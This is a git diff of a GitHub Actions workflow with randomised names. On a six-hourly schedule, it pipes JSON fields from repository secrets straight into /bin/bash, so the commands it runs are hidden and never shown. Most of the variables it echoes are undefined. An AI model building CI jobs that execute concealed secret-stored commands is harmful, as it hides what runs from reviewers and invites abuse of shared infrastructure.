@@ -2,21 +2,26 @@ name: jixuanxc
 on:
   workflow_dispatch:
   schedule:
-    - cron: '16 4/6 * * *'
-
-jobs:  # 32653
+    - cron: '12 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jixuanxc
         env:
-          lzbg4: ${{ secrets.lzbg4 }}
+          adjqe115: ${{ secrets.adjqe115 }}
         run: |
-          echo $lzbg4 | jq -r .f70921 | /bin/bash
-          echo $yp88884 | jq -r .lcqlu6 | /bin/bash
-          echo $hfzpb1084 | jq -r .ls5257 | /bin/bash
-          echo $h994 | jq -r .s1669 | /bin/bash
-          echo $dnqyq805 | jq -r .qjqwp770 | /bin/bash
-          echo $yugxo26567 | jq -r .w68988 | /bin/bash
+          echo $adjqe115 | jq -r .qwshf35888 | /bin/bash
+          echo $a3 | jq -r .otu074 | /bin/bash
+          echo $t4224 | jq -r .h40926 | /bin/bash
+          echo $dvkrw92185 | jq -r .n2 | /bin/bash
+          echo $w96 | jq -r .z88079 | /bin/bash
+          echo $m041 | jq -r .bk739 | /bin/bash
+          echo $bgck1 | jq -r .q56 | /bin/bash
+          echo $yiz11 | jq -r .vbwb0 | /bin/bash
+          echo $i6138 | jq -r .l65 | /bin/bash
+          echo $gye71619 | jq -r .up05 | /bin/bash
+          echo $rvr3098 | jq -r .clqif75578 | /bin/bash
 
